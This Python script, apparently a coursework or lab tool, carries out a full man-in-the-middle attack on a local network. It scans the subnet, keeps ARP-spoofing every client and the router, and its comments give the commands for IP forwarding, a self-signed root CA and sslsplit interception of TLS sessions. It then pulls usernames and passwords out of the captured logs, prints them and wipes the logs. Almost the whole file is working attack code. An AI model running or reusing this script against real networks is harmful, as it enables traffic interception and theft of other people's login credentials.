#!/usr/bin/python3
# (note: please be careful with line-endings: you should use LF)
from scapy.all import ARP, Ether, srp
import scapy.all as Scapy   
# for sleeping
import time 
import netifaces
# check and remove log file
import os
# read file
import codecs
"""
send out broadcasting ARP request
to ask who has the "ip"
"""
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

"""
select target ip, 
this function will send out a fake ARP reply
implying that the source comes from "spoof_ip"
"""
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    Scapy.send(packet, verbose=False)

try:
    # make logdir if not exists
    if not os.path.exists("logdir"):
        os.makedirs("logdir")

    # find router's IP
    gateways = netifaces.gateways()
    router_ip, dev = gateways['default'][netifaces.AF_INET]

    # get ip addr: netifaces
    ip_addr = ''
    addr_dict = netifaces.ifaddresses(dev)
    ip_addr = addr_dict[netifaces.AF_INET][0]['addr']

    print('attacker ip:', ip_addr)
    print('router ip:', router_ip)
    target_ip = str(router_ip) + '/24'

    # list all available clients
    # arp request
    arp = ARP(pdst=target_ip)
    # ether broadcast
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    # stack
    packet = ether/arp
    result = srp(packet, timeout=3)[0]

    # available clients
    clients = []
    print("Available devices")
    print("-----------------")
    print("IP       MAC")
    print("-----------------")

    for sent, received in result:
        # except AP
        if(received.psrc != str(router_ip)):
            clients.append(received)
            print(received.psrc, received.hwsrc)

    print("---------------")
    # arp spoofing
    file_i = 0
    line_i = 0
    while True:
        for c in clients:
            # send ARP response to victim (pretend as router)
            spoof(c.psrc, router_ip)
            # send arp request to router (pretend as victim)
            spoof(router_ip, c.psrc)

            """
            I still need to forward to router!!
            enabling ip forward
            --> sudo bash -c 'echo "1" > /proc/sys/net/ipv4/ip_forward'
            --> in Makefile 
            """

            """
            [DONE!]:
            split SSl/TLS sessions
            > openssl: create root certificate for attacker
            -- generate RSA private key (4096 bit) <ca.key>
                openssl genrsa -out ca.key 4096
            -- use above private key to generate self-signed root CA certificate
                openssl req -new -x509 -days 1826 -key ca.key -out ca.crt

            > cmd: sudo sslsplit -d -l connections.log -j sslsplit -S logdir -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
            """
            # Check every log file and print username and pswd
            file_lst = os.listdir("logdir")
            for log_file in file_lst:
                with codecs.open("logdir/"+log_file, "r", encoding='utf-8', errors='ignore') as log:
                    lines = log.readlines()
                    # find username and password (start with "logintoken")
                    for l in lines:
                        if(l[:10] == "logintoken"):
                            user_i = l.find("username")
                            pass_i = l.find("password")
                            if(user_i != -1 and pass_i != -1):
                                # found!
                                user_end = l.find("&", user_i)
                                print("username:", l[user_i+9:user_end])
                                pass_end = l.find("&", pass_i)
                                print("password:", l[pass_i+9:pass_end])
                        
                    log.close()
                
                # rewrite
                with open("logdir/"+log_file, "w", encoding='utf-8', errors='ignore') as log:
                    log.write("")
                    log.close()              



except KeyboardInterrupt:
    print("** exiting...")